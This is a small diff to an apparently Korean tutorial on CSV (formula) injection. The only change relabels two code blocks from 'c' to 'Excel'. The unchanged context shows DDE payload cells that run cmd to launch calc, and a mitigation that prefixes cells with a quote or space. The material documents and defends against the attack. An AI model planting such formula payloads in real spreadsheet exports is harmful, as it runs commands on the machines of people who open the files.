@@ -32,7 +32,7 @@ Formula Injection 취약점 내 한 종류로 분류되는 CSV Injection은 일�
 
 ### Exploit
 탐지한 부분에 악성 DDE를 삽입하여 작동 여부를 살펴보면 됩니다.
-```c
+```Excel
 #Basic Payload
 DDE ("cmd";"/C calc";"!A0")A0
 @SUM(1+1)*cmd|' /C calc'!A0
@@ -49,7 +49,7 @@ DDE ("cmd";"/C calc";"!A0")A0
 ```
 ## Security Measures
 악성 DDE를 동작시킬 수 있는 특수문자(`-`, `+`, `@`, `=` )가 Cell 가장 앞부분에 위치할 수 없도록 `Space`, `'` 등을 가장 앞에 삽입하여 조치하면 됩니다.
-```c
+```Excel
 '=2+5+cmd|' /C calc'!A0
  =cmd|' /C calc'!'A1'
 ```
